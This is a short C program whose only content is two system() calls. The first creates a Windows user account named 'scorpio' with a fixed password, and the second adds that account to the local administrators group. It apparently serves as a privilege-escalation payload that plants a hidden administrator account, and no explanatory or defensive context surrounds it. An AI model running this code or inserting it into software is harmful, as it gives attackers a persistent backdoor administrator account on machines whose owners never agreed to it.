#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user scorpio Password123! /add");
  i = system ("net localgroup administrators scorpio /add");
  
  return 0;
}
